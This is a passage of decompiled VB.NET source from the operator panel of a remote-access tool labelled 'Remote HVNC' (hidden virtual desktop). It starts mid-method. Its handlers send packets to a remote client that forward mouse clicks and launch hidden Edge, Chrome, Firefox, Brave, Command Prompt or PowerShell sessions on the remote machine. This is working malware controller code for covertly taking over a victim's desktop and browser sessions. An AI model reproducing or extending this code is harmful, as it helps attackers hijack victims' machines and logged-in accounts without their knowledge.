							msgPack.ForcePathObject("Packet").AsString = "MouseLeftUp"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Else
							Dim flag4 As Boolean = e.Button = MouseButtons.Right
							If flag4 Then
								Dim msgPack2 As MsgPack = New MsgPack()
								msgPack2.ForcePathObject("Packet").AsString = "MouseRightUp"
								msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
								msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
							End If
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000570 RID: 1392 RVA: 0x0002EFB8 File Offset: 0x0002D1B8
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Dim num As Integer = Me.int_0
			Me.int_0 = num + 100
			Dim flag As Boolean = Me.int_0 >= SystemInformation.DoubleClickTime
			If flag Then
				Me.bool_1 = True
				Me.bool_2 = False
				Me.int_0 = 0
			End If
		End Sub

		' Token: 0x06000571 RID: 1393 RVA: 0x0002F002 File Offset: 0x0002D202
		Private Sub SetingToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.Conx.Show(Cursor.Position)
		End Sub

		' Token: 0x06000572 RID: 1394 RVA: 0x0002F018 File Offset: 0x0002D218
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenEdgeBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000573 RID: 1395 RVA: 0x0002F080 File Offset: 0x0002D280
		Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenChromeBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000574 RID: 1396 RVA: 0x0002F0E8 File Offset: 0x0002D2E8
		Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenFireFoxBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000575 RID: 1397 RVA: 0x0002F150 File Offset: 0x0002D350
		Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenBraveBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000576 RID: 1398 RVA: 0x0002F1B8 File Offset: 0x0002D3B8
		Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenCommandPrompt"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000577 RID: 1399 RVA: 0x0002F220 File Offset: 0x0002D420
		Private Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenPowerShell"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000578 RID: 1400 RVA: 0x0002F288 File Offset: 0x0002D488
		Private Sub ToolStripMenuItem10_Click(sender As Object, e As EventArgs)
			MyBase.BeginInvoke(New MethodInvoker(Sub()
				Try
					Dim text As String = Me.ClientInfo.Text + "| Remote HVNC"
					Dim name As String = Functions.StringToBase64(text)
					Dim formCustomOpen As FormCustomOpen = CType(Application.OpenForms(name), FormCustomOpen)
					Dim flag As Boolean = formCustomOpen Is Nothing
					If flag Then
						formCustomOpen = New FormCustomOpen() With { .Name = name, .Text = "Remote HVNC | Custom Open", .Info = Me.ClientInfo.Text, .FormName = "Remote HVNC | Custom Open", .Client = Me.Client }
						formCustomOpen.Show()
					Else
						formCustomOpen.WindowState = FormWindowState.Minimized
						formCustomOpen.WindowState = FormWindowState.Normal
					End If
				Catch ex As Exception
					Me.StateHvnc.ForeColor = Color.Red
					Me.StateHvnc.Text = "Custom Open : Error " + ex.Message
				End Try
			End Sub))
		End Sub

		' Token: 0x06000579 RID: 1401 RVA: 0x0002F2A0 File Offset: 0x0002D4A0
		Private Sub QualityUsing_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.QualityUsing.Value < 11
				If flag Then
					Me.Quality.Text = Conversions.ToString(10) + "%Quality"
				Else
					Me.Quality.Text = Conversions.ToString(Me.QualityUsing.Value) + "%Quality"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000272 RID: 626
		Private FormSize As Boolean

		' Token: 0x04000273 RID: 627
		Public IntFPS As Integer

		' Token: 0x04000274 RID: 628
		Public sw As Stopwatch

		' Token: 0x04000275 RID: 629
		Public decoder As IUnsafeCodec

		' Token: 0x04000276 RID: 630
		Public rdSize As Size

		' Token: 0x04000277 RID: 631
		Public syncPicbox As Object

		' Token: 0x04000278 RID: 632
		Private _keysPressed As List(Of Keys)

		' Token: 0x0400027A RID: 634
		Private bool_1 As Boolean

		' Token: 0x0400027B RID: 635
		Private bool_2 As Boolean

		' Token: 0x0400027C RID: 636
		Private int_0 As Integer
	End Class
End Namespace
